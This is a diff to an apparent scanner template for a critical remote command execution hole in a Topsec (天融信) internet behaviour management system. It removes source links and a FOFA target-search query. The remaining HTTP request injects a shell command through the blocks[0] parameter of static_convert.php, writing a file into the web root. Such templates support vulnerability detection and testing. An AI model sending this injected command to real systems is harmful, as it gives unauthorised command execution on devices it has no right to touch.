@@ -3,12 +3,8 @@ info:
   name: 天融信 上网行为管理系统static_convert 远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mgud8qwcvxgfcitb'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: mgud8qwcvxgfcitb
-    fofa: app="天融信-上网行为管理系统"
 http:
 - raw:
   - 'GET /view/IPV6/naborTable/static_convert.php?blocks[0]=||%20%20echo%20''dudesuite''%20>>%20/var/www/html/dudesuite.txt%0A HTTP/1.1
